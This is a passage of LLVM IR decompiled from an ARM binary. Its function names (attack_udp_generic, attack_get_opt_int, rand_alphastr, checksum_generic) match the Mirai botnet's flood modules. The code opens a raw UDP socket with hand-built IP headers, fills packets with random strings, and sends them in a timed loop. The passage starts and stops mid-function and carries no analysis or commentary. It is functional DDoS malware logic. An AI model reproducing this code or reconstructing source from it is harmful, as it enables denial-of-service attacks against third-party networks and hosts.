  %v9_cbe0 = icmp eq i32 %v0_cbe0, %v1_cbe0
  %v0_cbe4 = load i32, i32* @r6, align 4
  %v1_cbe4 = add i32 %v0_cbe4, 4
  store i32 %v1_cbe4, i32* @r6, align 4
  br i1 %v9_cbe0, label %dec_label_pc_cbec, label %dec_label_pc_cb3c

dec_label_pc_cbec:                                ; preds = %dec_label_pc_cb8c, %dec_label_pc_cb20, %dec_label_pc_cab4
  %v1_cbf021 = phi i32 [ 0, %dec_label_pc_cab4 ], [ %v0_cbe0, %dec_label_pc_cb8c ], [ %v0_cb30, %dec_label_pc_cb20 ]
  store i32 0, i32* @r5, align 4
  %v2_cc24 = icmp eq i32 %v1_ca70, 0
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %dec_label_pc_cbf0.backedge, %dec_label_pc_cbec
  %v1_cbf0 = phi i32 [ %v1_cbf0.pre, %dec_label_pc_cbf0.backedge ], [ %v1_cbf021, %dec_label_pc_cbec ]
  %v1_cc28 = phi i32 [ %v0_cbf019, %dec_label_pc_cbf0.backedge ], [ 0, %dec_label_pc_cbec ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v5_cbf8 = icmp slt i32 %v1_cc28, %v1_cbf0
  br i1 %v5_cbf8, label %dec_label_pc_cc1c, label %dec_label_pc_cbfc

dec_label_pc_cbfc:                                ; preds = %dec_label_pc_cbf0
  %v2_cbfc = call i32 @__GI_time(i32* null)
  store i32 %v2_cbfc, i32* %r0.global-to-local, align 4
  store i32 %v0_caa810, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v6_cc0c = icmp slt i32 %v0_caa810, %v2_cbfc
  br i1 %v6_cc0c, label %dec_label_pc_cc10, label %dec_label_pc_cbf0.backedge

dec_label_pc_cc10.loopexit14:                     ; preds = %dec_label_pc_cacc
  %v1_cc18.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_cc10

dec_label_pc_cc10:                                ; preds = %dec_label_pc_cbfc, %dec_label_pc_cc10.loopexit14
  %v1_cc18 = phi i32 [ %v1_cc18.pre, %dec_label_pc_cc10.loopexit14 ], [ %v2_cbfc, %dec_label_pc_cbfc ]
  ret i32 %v1_cc18

dec_label_pc_cc1c:                                ; preds = %dec_label_pc_cbf0
  store i32 %v2_c9e0, i32* %r3.global-to-local, align 4
  %v4_cc28 = mul i32 %v1_cc28, 4
  %v5_cc28 = add i32 %v4_cc28, %v2_c9e0
  %v6_cc28 = inttoptr i32 %v5_cc28 to i32*
  %v7_cc28 = load i32, i32* %v6_cc28, align 4
  store i32 %v7_cc28, i32* @r4, align 4
  br i1 %v2_cc24, label %dec_label_pc_cc30, label %dec_label_pc_cc4c

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc1c, %dec_label_pc_cc4c
  %v0_cc34 = phi i32 [ %v7_cc28, %dec_label_pc_cc1c ], [ %v0_cc34.pre, %dec_label_pc_cc4c ]
  %v1_cc30 = phi i32 [ %v1_cc28, %dec_label_pc_cc1c ], [ %v1_cc30.pre, %dec_label_pc_cc4c ]
  %v0_cc30 = load i32, i32* @sb, align 4
  %v4_cc30 = mul i32 %v1_cc30, 4
  %v5_cc30 = add i32 %v4_cc30, %v0_cc30
  %v6_cc30 = inttoptr i32 %v5_cc30 to i32*
  %v7_cc30 = load i32, i32* %v6_cc30, align 4
  store i32 %v7_cc30, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_cc40 = call i32 @__libc_send(i32 %v7_cc30, i32 %v0_cc34, i32 %v3_ca54, i32 16384)
  store i32 %v4_cc40, i32* %r0.global-to-local, align 4
  %v0_cc44 = load i32, i32* @r5, align 4
  %v1_cc44 = add i32 %v0_cc44, 1
  store i32 %v1_cc44, i32* @r5, align 4
  br label %dec_label_pc_cbf0.backedge

dec_label_pc_cbf0.backedge:                       ; preds = %dec_label_pc_cc30, %dec_label_pc_cbfc
  %v0_cbf019 = phi i32 [ %v1_cc44, %dec_label_pc_cc30 ], [ 0, %dec_label_pc_cbfc ]
  %v1_cbf0.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc1c
  store i32 %v7_cc28, i32* %r0.global-to-local, align 4
  %v2_cc54 = call i32 @rand_alphastr(i32 %v7_cc28, i32 %v3_ca54)
  store i32 %v2_cc54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_cc60 = load i32, i32* @r4, align 4
  %v4_cc60 = add i32 %v3_cc60, %v3_ca54
  %v5_cc60 = inttoptr i32 %v4_cc60 to i8*
  store i8 0, i8* %v5_cc60, align 1
  %v1_cc30.pre = load i32, i32* @r5, align 4
  %v0_cc34.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cc30

dec_label_pc_cc68:                                ; preds = %entry
  %v1_caa012 = load i32, i32* @r7, align 4
  %v2_caa013 = add i32 %v1_caa012, %v2_ca8c
  store i32 %v2_caa013, i32* %r0.global-to-local, align 4
  %v0_cc68 = call i32 @rand_next()
  %v3_cc70 = urem i32 %v0_cc68, 65536
  store i32 %v3_cc70, i32* %r0.global-to-local, align 4
  %extract.t59 = trunc i32 %v0_cc68 to i16
  br label %dec_label_pc_cab4

; uselistorder directives
  uselistorder i32 %v0_cc68, { 1, 0 }
  uselistorder i32 %v2_caa013, { 1, 0 }
  uselistorder i32 %v7_cc28, { 2, 1, 0, 3 }
  uselistorder i32 %v5_cbc8, { 1, 0 }
  uselistorder i32 %v0_cb78, { 1, 0 }
  uselistorder i32 %v0_cb50, { 2, 0, 1 }
  uselistorder i32 %v3_cad8, { 1, 0, 2 }
  uselistorder i32 %v0_caa810, { 1, 0 }
  uselistorder i32 %v4_ca9c, { 1, 0 }
  uselistorder i32 %v3_ca54, { 2, 1, 0 }
  uselistorder i32 %v2_c9e0, { 0, 2, 1 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 10, 11, 8, 9, 12, 14, 13, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 19, 8, 7, 11, 9, 10, 12, 13, 23, 21, 15, 14, 16, 18, 20, 17, 22, 25, 24, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cc30, { 1, 0 }
  uselistorder label %dec_label_pc_cc10, { 1, 0 }
  uselistorder label %dec_label_pc_cacc, { 1, 0 }
  uselistorder label %dec_label_pc_cab4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_cc7c = load i32, i32* @lr, align 4
  store i32 0, i32* @r8, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_cca8 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_ccac = load i32, i32* @r4, align 4
  store i32 %v0_ccac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_ccb8 = load i32, i32* @r8, align 4
  store i32 %v0_ccb8, i32* %r3.global-to-local, align 4
  %v0_ccbc = load i32, i32* @r5, align 4
  store i32 %v0_ccbc, i32* %r0.global-to-local, align 4
  %v5_ccc0 = inttoptr i32 %v0_ccac to i32*
  %v6_ccc0 = call i32 @attack_get_opt_int(i32 %v0_ccbc, i32* %v5_ccc0, i32 2, i32 %v0_ccb8)
  %v1_cccc = urem i32 %v6_ccc0, 256
  store i32 %v1_cccc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ccd8 = load i32, i32* @r4, align 4
  store i32 %v0_ccd8, i32* %r1.global-to-local, align 4
  %v0_ccdc = load i32, i32* @r5, align 4
  store i32 %v0_ccdc, i32* %r0.global-to-local, align 4
  %v5_cce0 = trunc i32 %v6_ccc0 to i8
  %v7_cce4 = inttoptr i32 %v0_ccd8 to i32*
  %v8_cce4 = call i32 @attack_get_opt_int(i32 %v0_ccdc, i32* %v7_cce4, i32 3, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_cce8 = load i32, i32* @r4, align 4
  store i32 %v0_cce8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_ccf8 = load i32, i32* @r5, align 4
  store i32 %v0_ccf8, i32* %r0.global-to-local, align 4
  %v5_ccfc = inttoptr i32 %v0_cce8 to i32*
  %v6_ccfc = call i32 @attack_get_opt_int(i32 %v0_ccf8, i32* %v5_ccfc, i32 4, i32 64)
  %v1_cd04 = urem i32 %v6_ccfc, 256
  store i32 %v1_cd04, i32* %ip.global-to-local, align 4
  %v0_cd08 = load i32, i32* @r4, align 4
  store i32 %v0_cd08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_cd10 = load i32, i32* @r8, align 4
  store i32 %v0_cd10, i32* %r3.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r5, align 4
  store i32 %v0_cd14, i32* %r0.global-to-local, align 4
  %v5_cd18 = trunc i32 %v6_ccfc to i8
  %v6_cd1c = inttoptr i32 %v0_cd08 to i32*
  %v7_cd1c = call i32 @attack_get_opt_int(i32 %v0_cd14, i32* %v6_cd1c, i32 5, i32 %v0_cd10)
  %v1_cd28 = urem i32 %v7_cd1c, 256
  store i32 %v1_cd28, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_cd34 = load i32, i32* @r4, align 4
  store i32 %v0_cd34, i32* %r1.global-to-local, align 4
  %v0_cd38 = load i32, i32* @r5, align 4
  store i32 %v0_cd38, i32* %r0.global-to-local, align 4
  %v6_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v7_cd40 = call i32 @attack_get_opt_int(i32 %v0_cd38, i32* %v6_cd40, i32 6, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_cd4c = load i32, i32* @r4, align 4
  store i32 %v0_cd4c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_cd58 = load i32, i32* @r5, align 4
  store i32 %v0_cd58, i32* %r0.global-to-local, align 4
  %v6_cd5c = inttoptr i32 %v0_cd4c to i32*
  %v7_cd5c = call i32 @attack_get_opt_int(i32 %v0_cd58, i32* %v6_cd5c, i32 7, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_cd60 = load i32, i32* @r4, align 4
  store i32 %v0_cd60, i32* %r1.global-to-local, align 4
  %v0_cd68 = load i32, i32* @r8, align 4
  store i32 %v0_cd68, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_cd70 = load i32, i32* @r5, align 4
  store i32 %v0_cd70, i32* %r0.global-to-local, align 4
  %v5_cd74 = inttoptr i32 %v0_cd60 to i32*
  %v6_cd74 = call i32 @attack_get_opt_int(i32 %v0_cd70, i32* %v5_cd74, i32 %v0_cd68, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_cd80 = load i32, i32* @r4, align 4
  store i32 %v0_cd80, i32* %r1.global-to-local, align 4
  store i32 %v6_cd74, i32* @sl, align 4
  %v0_cd88 = load i32, i32* @r5, align 4
  store i32 %v0_cd88, i32* %r0.global-to-local, align 4
  %v4_cd8c = inttoptr i32 %v0_cd80 to i32*
  %v5_cd8c = call i32 @attack_get_opt_int(i32 %v0_cd88, i32* %v4_cd8c, i32 1, i32 1)
  %v2_cd98 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_cd98, i32* %r3.global-to-local, align 4
  %v1_cd9c = urem i32 %v5_cd8c, 256
  store i32 %v1_cd9c, i32* %ip.global-to-local, align 4
  %v0_cda0 = load i32, i32* @r4, align 4
  store i32 %v0_cda0, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_cda8 = load i32, i32* @r5, align 4
  store i32 %v0_cda8, i32* %r0.global-to-local, align 4
  %v5_cdb0 = inttoptr i32 %v0_cda0 to i32*
  %v6_cdb0 = call i32 @attack_get_opt_int(i32 %v0_cda8, i32* %v5_cdb0, i32 24, i32 %v2_cd98)
  store i32 %v6_cdb0, i32* @sb, align 4
  %v0_cdb8 = load i32, i32* @r8, align 4
  store i32 %v0_cdb8, i32* %r0.global-to-local, align 4
  %v1_cdbc = inttoptr i32 %v0_cdb8 to i32*
  %v2_cdbc = call i32 @__GI_time(i32* %v1_cdbc)
  %v1_cdc0 = load i32, i32* @r6, align 4
  %v2_cdc0 = add i32 %v1_cdc0, %v2_cdbc
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_cdd4 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_cdd4, i32* %r0.global-to-local, align 4
  %v7_cdd8 = icmp eq i32 %v3_cdd4, -1
  store i32 %v3_cdd4, i32* @fp, align 4
  br i1 %v7_cdd8, label %dec_label_pc_d22c, label %dec_label_pc_cde4

dec_label_pc_cde4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_cdec = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_cdec, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_cdf4 = load i32, i32* @r8, align 4
  store i32 %v0_cdf4, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ce00 = call i32 @__GI_setsockopt(i32 %v3_cdd4, i32 %v0_cdf4, i32 3, i32 %v6_cdec, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ce00, i32* %r0.global-to-local, align 4
  %v7_ce04 = icmp eq i32 %v5_ce00, -1
  br i1 %v7_ce04, label %dec_label_pc_d238, label %dec_label_pc_ce0c

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_cde4
  %v0_ce0c = load i32, i32* @sl, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ce18 = urem i32 %v0_ce0c, 65536
  %v3_ce1c = icmp ugt i32 %v3_ce18, 1459
  br i1 %v3_ce1c, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_ce0c
  br label %bb40

bb40:                                             ; preds = %dec_label_pc_ce0c, %bb
  %storemerge = phi i32 [ 1460, %bb ], [ %v3_ce18, %dec_label_pc_ce0c ]
  %v0_ce28 = phi i32 [ 1460, %bb ], [ %v3_ce18, %dec_label_pc_ce0c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  store i32 %v7_cd40, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v3_ce3c = mul i32 %v7_cd5c, 65536
  store i32 %v3_ce3c, i32* %r2.global-to-local, align 4
  %v3_ce44 = urem i32 %v8_cce4, 65536
  %v3_ce48 = urem i32 %v7_cd40, 65536
  store i32 %v3_ce48, i32* %ip.global-to-local, align 4
  %v3_ce4c = urem i32 %v7_cd5c, 65536
  store i32 %v3_ce4c, i32* %r0.global-to-local, align 4
  %v2_ce50 = icmp eq i32 %arg2, 0
  %v0_ce58 = load i32, i32* @r8, align 4
  store i32 %v0_ce58, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %.dec_label_pc_cf84.preheader_crit_edge, label %dec_label_pc_ce6c

.dec_label_pc_cf84.preheader_crit_edge:           ; preds = %bb40
  %.pre = add nuw nsw i32 %v0_ce28, 8
  %.pre10 = add nuw nsw i32 %v0_ce28, 28
  br label %dec_label_pc_cf84.preheader

dec_label_pc_ce6c:                                ; preds = %bb40
  %v1_ce74 = add nuw nsw i32 %v0_ce28, 28
  %v1_ce78 = add nuw nsw i32 %v0_ce28, 8
  %tmp41 = mul nuw nsw i32 %v3_ce48, 256
  %v3_ce88 = and i32 %tmp41, 65280
  %v3_ce90 = mul i32 %v1_ce74, 65536
  store i32 %v3_ce90, i32* @lr, align 4
  %tmp42 = udiv i32 %v7_cd40, 256
  %v4_ce98 = urem i32 %tmp42, 256
  %v5_ce98 = or i32 %v3_ce88, %v4_ce98
  store i32 %v5_ce98, i32* @sl, align 4
  store i32 %v3_ce3c, i32* %r1.global-to-local, align 4
  %tmp43 = mul i32 %v7_cd5c, 256
  %v3_ceb0 = and i32 %tmp43, 65280
  %v2_ceb4 = icmp eq i32 %v1_cd28, 0
  %tmp44 = mul nuw nsw i32 %v1_ce74, 256
  %v3_ceb8 = and i32 %tmp44, 65280
  store i32 %v3_ceb8, i32* %r3.global-to-local, align 4
  %tmp45 = mul i32 %v8_cce4, 256
  %v3_cebc = and i32 %tmp45, 65280
  store i32 %v3_cebc, i32* %r2.global-to-local, align 4
  %tmp46 = mul nuw nsw i32 %v1_ce78, 256
  %v3_cec0 = and i32 %tmp46, 65280
  store i32 %v3_cec0, i32* %ip.global-to-local, align 4
  %tmp47 = udiv i32 %v7_cd5c, 256
  %v4_cec4 = urem i32 %tmp47, 256
  %v5_cec4 = or i32 %v4_cec4, %v3_ceb0
  store i32 %v5_cec4, i32* %r0.global-to-local, align 4
  %tmp48 = udiv i32 %v8_cce4, 256
  %v4_cec8 = urem i32 %tmp48, 256
  %v5_cec8 = or i32 %v4_cec8, %v3_cebc
  store i32 %v5_cec8, i32* @r8, align 4
  %tmp49 = udiv i32 %v1_ce74, 256
  %v4_cecc = urem i32 %tmp49, 256
  %v5_cecc = or i32 %v4_cecc, %v3_ceb8
  store i32 %v5_cecc, i32* @r6, align 4
  %tmp50 = udiv i32 %v1_ce78, 256
  %v4_ced0 = urem i32 %tmp50, 256
  %v5_ced0 = or i32 %v4_ced0, %v3_cec0
  store i32 %v5_ced0, i32* @r5, align 4
  %v5_ced4 = trunc i32 %v5_cec4 to i16
  store i32 0, i32* @r4, align 4
  br i1 %v2_ceb4, label %dec_label_pc_cee0.preheader, label %dec_label_pc_d16c.preheader

dec_label_pc_d16c.preheader:                      ; preds = %dec_label_pc_ce6c
  %v4_d1bc = sext i8 %v5_cd18 to i32
  %v4_d1fc = sext i16 %v5_ced4 to i32
  br label %dec_label_pc_d16c

dec_label_pc_cee0.preheader:                      ; preds = %dec_label_pc_ce6c
  %v4_cf58 = sext i16 %v5_ced4 to i32
  br label %dec_label_pc_cee0

dec_label_pc_cee0:                                ; preds = %dec_label_pc_cee0.preheader, %dec_label_pc_cee0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ceec = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_ceec, i32* %r0.global-to-local, align 4
  store i32 %v2_cca8, i32* %r2.global-to-local, align 4
  %v2_cef8 = load i32, i32* @r4, align 4
  %v5_cef8 = mul i32 %v2_cef8, 4
  %v6_cef8 = add i32 %v5_cef8, %v2_cca8
  %v7_cef8 = inttoptr i32 %v6_cef8 to i32*
  store i32 %v2_ceec, i32* %v7_cef8, align 4
  %v3_cefc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cefc, i32* %r1.global-to-local, align 4
  %v0_cf00 = load i32, i32* %r2.global-to-local, align 4
  %v4_cf00 = mul i32 %v3_cefc, 4
  %v5_cf00 = add i32 %v0_cf00, %v4_cf00
  %v6_cf00 = inttoptr i32 %v5_cf00 to i32*
  %v7_cf00 = load i32, i32* %v6_cf00, align 4
  store i32 %v7_cf00, i32* %r3.global-to-local, align 4
  %v1_cf04 = inttoptr i32 %v7_cf00 to i8*
  %v2_cf04 = load i8, i8* %v1_cf04, align 1
  %tmp = urem i8 %v2_cf04, 16
  %v1_cf08 = zext i8 %tmp to i32
  %v1_cf0c = or i32 %v1_cf08, 64
  store i32 %v1_cf0c, i32* %r2.global-to-local, align 4
  %v1_cf10 = trunc i32 %v1_cf0c to i8
  store i8 %v1_cf10, i8* %v1_cf04, align 1
  %v0_cf14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf14 = inttoptr i32 %v0_cf14 to i8*
  %v2_cf14 = load i8, i8* %v1_cf14, align 1
  %v1_cf18 = and i8 %v2_cf14, -16
  %v1_cf1c = or i8 %v1_cf18, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_cf1c, i8* %v1_cf14, align 1
  %v0_cf28 = load i32, i32* %ip.global-to-local, align 4
  %v1_cf28 = trunc i32 %v0_cf28 to i8
  %v2_cf28 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf28 = add i32 %v2_cf28, 9
  %v4_cf28 = inttoptr i32 %v3_cf28 to i8*
  store i8 %v1_cf28, i8* %v4_cf28, align 1
  %v2_cf30 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf30 = add i32 %v2_cf30, 1
  %v4_cf30 = inttoptr i32 %v3_cf30 to i8*
  store i8 %v5_cce0, i8* %v4_cf30, align 1
  %v0_cf38 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf38 = mul i32 %v0_cf38, 32
  store i32 %v3_cf38, i32* %r0.global-to-local, align 4
  %v2_cf3c = load i32, i32* %r3.global-to-local, align 4
  %v3_cf3c = add i32 %v2_cf3c, 8
  %v4_cf3c = inttoptr i32 %v3_cf3c to i8*
  store i8 %v5_cd18, i8* %v4_cf3c, align 1
  %v0_cf40 = load i32, i32* @sb, align 4
  %v1_cf40 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf40 = add i32 %v1_cf40, 12
  %v3_cf40 = inttoptr i32 %v2_cf40 to i32*
  store i32 %v0_cf40, i32* %v3_cf40, align 4
  %v0_cf44 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf44 = load i32, i32* %r1.global-to-local, align 4
  %tmp52 = mul i32 %v1_cf44, -8
  %v5_cf44 = add i32 %v0_cf44, %tmp52
  %v1_cf48 = load i32, i32* @r7, align 4
  %v2_cf48 = add i32 %v5_cf44, %v1_cf48
  store i32 %v2_cf48, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v1_cf50 = add i32 %v1_cf44, 1
  store i32 %v1_cf50, i32* @r4, align 4
  %v1_cf54 = add i32 %v2_cf48, 16
  %v2_cf54 = inttoptr i32 %v1_cf54 to i32*
  %v3_cf54 = load i32, i32* %v2_cf54, align 4
  store i32 %v3_cf54, i32* %r2.global-to-local, align 4
  store i32 %v4_cf58, i32* %r0.global-to-local, align 4
  %v0_cf5c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf5c = add i32 %v0_cf5c, 20
  store i32 %v1_cf5c, i32* %r1.global-to-local, align 4
  %v0_cf64 = load i32, i32* @r6, align 4
  %v1_cf64 = trunc i32 %v0_cf64 to i16
  %v3_cf64 = add i32 %v0_cf5c, 2
  %v4_cf64 = inttoptr i32 %v3_cf64 to i16*
  store i16 %v1_cf64, i16* %v4_cf64, align 2
  %v0_cf68 = load i32, i32* @r8, align 4
  %v1_cf68 = trunc i32 %v0_cf68 to i16
  %v2_cf68 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf68 = add i32 %v2_cf68, 4
  %v4_cf68 = inttoptr i32 %v3_cf68 to i16*
  store i16 %v1_cf68, i16* %v4_cf68, align 2
  %v0_cf6c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf6c = load i32, i32* %r3.global-to-local, align 4
  %v2_cf6c = add i32 %v1_cf6c, 16
  %v3_cf6c = inttoptr i32 %v2_cf6c to i32*
  store i32 %v0_cf6c, i32* %v3_cf6c, align 4
  %v0_cf70 = load i32, i32* @sl, align 4
  %v1_cf70 = trunc i32 %v0_cf70 to i16
  %v2_cf70 = load i32, i32* %r3.global-to-local, align 4
  %v3_cf70 = add i32 %v2_cf70, 20
  %v4_cf70 = inttoptr i32 %v3_cf70 to i16*
  store i16 %v1_cf70, i16* %v4_cf70, align 2
  %v0_cf74 = load i32, i32* @r5, align 4
  %v1_cf74 = trunc i32 %v0_cf74 to i16
  %v2_cf74 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf74 = add i32 %v2_cf74, 4
  %v4_cf74 = inttoptr i32 %v3_cf74 to i16*
  store i16 %v1_cf74, i16* %v4_cf74, align 2
  %v0_cf78 = load i32, i32* %r0.global-to-local, align 4
  %v1_cf78 = trunc i32 %v0_cf78 to i16
  %v2_cf78 = load i32, i32* %r1.global-to-local, align 4
  %v3_cf78 = add i32 %v2_cf78, 2
  %v4_cf78 = inttoptr i32 %v3_cf78 to i16*
  store i16 %v1_cf78, i16* %v4_cf78, align 2
  %v0_cf7c = load i32, i32* @r4, align 4
  store i32 %v0_cf7c, i32* %stack_var_-44, align 4
  %v5_cf80 = icmp slt i32 %v1_cf50, %arg2
  br i1 %v5_cf80, label %dec_label_pc_cee0, label %dec_label_pc_cf84.preheader

dec_label_pc_cf84.preheader:                      ; preds = %dec_label_pc_d16c, %dec_label_pc_cee0, %.dec_label_pc_cf84.preheader_crit_edge
  %v1_cfa4.pre-phi = phi i32 [ %.pre10, %.dec_label_pc_cf84.preheader_crit_edge ], [ %v1_ce74, %dec_label_pc_cee0 ], [ %v1_ce74, %dec_label_pc_d16c ]
  %v1_cfa0.pre-phi = phi i32 [ %.pre, %.dec_label_pc_cf84.preheader_crit_edge ], [ %v1_ce78, %dec_label_pc_cee0 ], [ %v1_ce78, %dec_label_pc_d16c ]
  %v9_d104 = icmp eq i32 %v3_ce44, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  %v2_d140 = icmp eq i32 %v1_cd9c, 0
  br label %dec_label_pc_cf84

dec_label_pc_cf84:                                ; preds = %dec_label_pc_cf84.preheader, %dec_label_pc_d218
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ce50, label %dec_label_pc_d218, label %dec_label_pc_cf98

dec_label_pc_cf98:                                ; preds = %dec_label_pc_cf84
  store i32 %v0_ce28, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_cfa0.pre-phi, i32* @sl, align 4
  store i32 %v1_cfa4.pre-phi, i32* @r8, align 4
  br label %dec_label_pc_d074

dec_label_pc_cfac:                                ; preds = %dec_label_pc_d074
  %v0_cfac = load i32, i32* @sb, align 4
  %v7_cfac = icmp eq i32 %v0_cfac, -1
  br i1 %v7_cfac, label %dec_label_pc_d0f4, label %dec_label_pc_cfb4

dec_label_pc_cfb4:                                ; preds = %dec_label_pc_d098, %dec_label_pc_cfac
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* @r4, align 4
  br i1 %v9_d104, label %dec_label_pc_d110, label %dec_label_pc_cfc8

dec_label_pc_cfc8:                                ; preds = %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge, %dec_label_pc_cfb4
  %v1_cfcc = phi i32 [ %v1_cfcc.pre, %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge ], [ ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), %dec_label_pc_cfb4 ]
  store i32 %v3_ce48, i32* %r0.global-to-local, align 4
  %v9_cfcc = icmp eq i32 %v3_ce48, %v1_cfcc
  br i1 %v9_cfcc, label %dec_label_pc_d124, label %dec_label_pc_cfd4

dec_label_pc_cfd4:                                ; preds = %dec_label_pc_d110, %dec_label_pc_cfc8
  %v1_cfd8 = phi i32 [ %v1_d11c, %dec_label_pc_d110 ], [ %v1_cfcc, %dec_label_pc_cfc8 ]
  store i32 %v3_ce4c, i32* %r1.global-to-local, align 4
  %v9_cfd8 = icmp eq i32 %v3_ce4c, %v1_cfd8
  br i1 %v9_cfd8, label %dec_label_pc_d138, label %dec_label_pc_cfe0

dec_label_pc_cfe0:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cfd4
  store i32 %v1_cd9c, i32* %r2.global-to-local, align 4
  br i1 %v2_d140, label %dec_label_pc_cfec, label %dec_label_pc_d14c

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d138, %dec_label_pc_d14c
  %v2_cff0 = load i32, i32* @r5, align 4
  %v3_cff0 = add i32 %v2_cff0, 10
  %v4_cff0 = inttoptr i32 %v3_cff0 to i16*
  store i16 0, i16* %v4_cff0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cff8 = load i32, i32* @r5, align 4
  store i32 %v0_cff8, i32* @r0, align 4
  %v2_cffc = call i32 @checksum_generic(i32 %v0_cff8, i32 20)
  %v3_cffc = trunc i32 %v2_cffc to i16
  store i32 %v2_cffc, i32* %r0.global-to-local, align 4
